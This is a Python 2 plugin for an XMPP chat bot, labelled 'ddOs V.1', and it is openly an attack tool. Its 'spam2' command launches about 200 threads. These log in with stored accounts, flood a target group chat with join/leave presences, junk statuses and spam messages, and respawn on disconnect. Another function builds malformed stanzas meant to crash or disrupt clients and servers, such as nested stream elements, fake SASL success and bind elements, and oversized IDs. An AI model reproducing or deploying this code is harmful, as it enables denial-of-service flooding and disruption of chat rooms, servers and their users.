# -*- coding: utf-8 -*-

#############################
###*ddOs V.1|*   ###        *
#############################
## daa@xmpp.ru ##
#################


from xmpp import *
from random import *
from sys import maxint
from pdb import *
import os, xmpp, sys
import threading, types, random
import pdb, urllib
statusx=['56456496564965674656446554326554654965874965406546543165244361544654656496564965476659465045690465894654345664564542365432654532654565465649656476594766594676594676549676549665','!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦!⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦˚ *.⠀ . .✦⠀ !⠀⠀⠀⠀⠀⠀⠀. ⠀⠀⠀✦ ⠀ ⠀ ⠀⠀⠀⠀⠀* ⠀⠀⠀. . ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀✦⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀☄️ ⠀ ⠀⠀⠀⠀⠀⠀. . ﾟ . . ✦ , .☀️* .. . ✦⠀ , *,⠀⠀⠀⠀⠀⠀⠀. ⠀ ⠀. ˚ ⠀ ⠀ , ..*⠀ ⠀ ⠀✦⠀ .. . ⠀🌕.🚀˚ ﾟ ..⠀ 🌎⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀‍⠀,* ⠀.. ⠀✦']

VIPE = {}
GEN_xI=[]
goto = 0
xnemssx = NaMe
xservx = Serverx
xpasx = PaSsS	

def slaefr_joinx(cl, groupchat):
  nick = 'sddos-'+str(random.randrange(00, 20))+u''
  GEN_xI.append(groupchat+'/'+nick)
  prs=xmpp.protocol.Presence(groupchat+'/'+nick)
  prs.setStatus(random.choice(statusx))
  prs.setShow(random.choice(slaefr_show))
  prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
  try:
    cl.send(prs)
  except:
    pass

def slaefrx_xtimer(type,source,parameters):
  time.sleep(80)
  try:
    REP_OTAKE['n']=0
    REP_OTAKE['err']=0
    REP_OTAKE['thr']=0
  except:
    pass
  if '1' in ONVIPE:
    ONVIPE.remove('1')
    print 'Spam Off'
    
def slaefr_zthread(p):
  if len(p)>10:
    if p[0] in [101] and p[6] in [49]:
      return True
  return False

		    
def leave_slaefr(cl,groupchat,status='BYE'):
  prs=xmpp.Presence(groupchat, 'unavailable')
  try:
    cl.send(prs)
  except:
    pass

def gotoxxx_start(type,source,parameters):
  global goto
  if parameters:
    if not parameters.count('@'):
      reply(type, source, u'This is not a room /:-)')
      return
    body = parameters.split()
    conf = body[0].lower()
    goto = 1
    reply(type,source,u'Ok')
    print u'Ok Started'
    threading.Thread(None, slaefrx_xtimer, 'slaefrx_xtimer'+str(random.randrange(0, 999)), (type,source,parameters)).start()
    for x in range(0, 200):
      threading.Thread(None, goto_xx, 'goto_xx'+str(random.randrange(0, 999)), (type,source,conf)).start()           
		
def goto_xx(type,source,conf):
  if not goto:
    return
  try:
    mainRes = 'sdos_'+str(random.randrange(00, 20))      
    x2x = random.choice(xnemssx)
    passwx = random.choice(xpasx)
    gservx = random.choice(xservx)
    name, domain, password, newBotJid = x2x, gservx, passwx, 0
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    psw = u''
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    au=cl.auth(jid.getNode(), password, jid.getResource())
    cl.sendInitPresence()
    if cl.isConnected():
      threading.Thread(None, slaefr_xmessagexx, 'slaefr_xmessagexx'+str(random.randrange(0, 999)), (cl,conf)).start()      
      threading.Thread(None, Slaefr_nicks, 'Slaefr_nicks'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, Slaefr_xchange_prs, 'Slaefr_xchange_prs'+str(random.randrange(0, 999)), (cl,conf)).start()
    else:
      threading.Thread(None, goto_xx, 'goto_xx', (type,source,conf)).start()
      return
  except:
    pass



def Slaefr_xchange_prs(cl, conf):
  prs=xmpp.protocol.Presence()
  prs.setShow(random.choice(slaefr_show))
  prs.setStatus(random.choice(statusx))
  while goto and cl.isConnected():
    slaefr_joinx(cl, conf)
    prs.setShow(random.choice(slaefr_show))
    prs.setStatus(floood(Slaefr_Status))
    leave_slaefr(cl,conf)
    slaefr_joinx(cl,conf)
    prs.setShow(random.choice(slaefr_show))
    prs.setStatus(random.choice(statusx))
  if goto:
    try:
      threading.Thread(None, goto_xx, 'goto_xx'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def slaefr_xmessagexx(cl,conf):
  z=0
  slaefr_joinx(cl,conf)
  z+=1
  time.sleep(0)
  try:
    for x in range(0, 20):
      text =  floood(Slaefr_Msg)+str(random.randrange(00, 999))
      omsg = xmpp.protocol.Message(conf, text, 'groupchat')
      cl.send(omsg)
  except:
    pass

def message(cl,msg):
  pass

def Slaefr_nicks(cl, conf):
  z=0
  while goto and cl.isConnected():
    slaefr_joinx(cl, conf)
    time.sleep(0)
    z+=1
  if goto:
    try:
      threading.Thread(None, goto_xx, 'goto_xx'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def slaefr_joinx_and_leave(cl, conf):
    slaefr_joinx(cl, conf)
    leave_slaefr(cl,conf)

def gotox_stop(type, source, parameters):
  global goto
  if goto:
    goto = 0
    reply(type,source,u'SToPpeD')
    return
  else:
    reply(type,source,u'NoT AcTiVe')

def leave_slaefr(cl,groupchat,status='BYE'):
  prs=xmpp.Presence(groupchat, 'unavailable')
  try:
    cl.send(prs)
  except:
    pass

    
def mousetrap_join(cl,groupchat,nick):
        add=['|','_','/','.','0']
        botnick = generate_mousetrap(random.Random().randint(7,1100))
        if MOUSE_NICK:
                botnick=random.choice(MOUSE_NICK)
        CAPS = 'http://www.syriatalk.org/caps'
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%"><priority>%PRIORETET%</priority><x xmlns="http://jabber.org/protocol/muc" /><c xmlns="http://jabber.org/protocol/caps" node="%CAPS%" ver="" /><show>%SHOW%</show><x xmlns="http://qip.ru/x-status" id="100"><title></title></x><status>hgfhhfmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm</status></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="getros">%PRIORETET%<jוNcרg xmlns="jabber:iq:roster"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq  type="result" xml:lang="en" to="%TO_ROOM%/%NICK%" id="Mackdos.alrb">%PRIORETET%<Mackdos.alrb xmlns="http ://jabber.org/protocol/profile"> <stream:stream xmlns:stream="http ://etherx.jabber.org/streams" version="1.3.6" xml:lang="en" to="${param.full}"/> <success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams"/><stream:stream xmlns:stream="http://etherx.jabber.org/streams" type="error" to="${param.full}" id="Mackdos.alrb"><auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/></stream:stream> </Mackdos.alrb></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to=%TO_ROOM%/%NICK%"" type="get" id="_arab_1498>>>>>>>>>>[)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))>>>70http://arab5123902"><ping xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<presence to="%TO_ROOM%/%NICK%" id="request_2308">%PRIORETET%<status></status><priority>0</priority><stream:stream xmlns="d"><x xmlns="vcard-temp:x:update"><photo/></x><c xmlns="http://jabber.org/protocol/caps" node="" ver="=" hash=""/><x xmlns="http://jabber.org/protocol/muc#user"><itemjid="%TO_ROOM%/%NICK%" affiliation="owner" role="moderator"/></x></stream:stream></presence>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="A((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((A"><query xmlns="jabber:iq:version"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="result" id="XmlnsTenDaxmlns">%PRIORETET%<x xmlns="http://jabber.org/protocol/profile"><stream:stream/><stream:stream/><stream:stream/><stream:stream/><success xmlns="urn:ietf:params:xml:ns:xmpp-sasl"/><bind xmlns="urn:ietf:params:xml:ns:xmpp-bind"/></x></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id=A((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((A"><query xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id=A)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))A><query xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" type="get" id="Spam)))))))))))))))))">%PRIORETET%<ping xmlns="urn:xmpp:ping"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" xml="ar" id="2525999" type="get">%PRIORETET%<session xmlns="http://www.google.com/session" id="99954676655" type="initiate" initiator=""/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<message to="%TO_ROOM%/%NICK%" type="tenda">%PRIORETET%<error code="">%PRIORETET%</error></message>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        NODE_ = u'<iq id="A█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;LA" type="get" to="%TO_ROOM%/%NICK%"><query xmlns="http://jabber.org/protocol/disco#info" node="http://jabber.org/protocol/rosterx"/></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')                               
        NODE_ = u'<iq to="%TO_ROOM%/%NICK%" id="A█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;L;;LG;L█◙◙█▀▄▀█◙◙█►_IUIUKK;L;LA" type="get"><query xmlns="jabber:iq:version"><name>home</name><version>123456</version><os>pc version</os></query></iq>'.replace('%TO_ROOM%', groupchat).replace('%NICK%', botnick).replace('%PRIORETET%', u'100').replace('%CAPS%', CAPS).replace('%TEXT%', u'').replace('%SHOW%', u'Hehehehehe, I\'m Here!')
        node=xmpp.simplexml.XML2Node(unicode(NODE_).encode('utf8'))

        prs = xmpp.protocol.Presence(groupchat+'/'+botnick)
        prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
        try:
                cl.send(node)
        except:
                pass
        threading.Thread(None, mousetrap_query, 'mousetrap_query'+str(random.randrange(0, 999)), (cl,groupchat,nick,)).start()
        	   

register(gotoxxx_start, Prefix+'spam2', 9)
register(gotox_stop, Prefix+'stop2', 9)

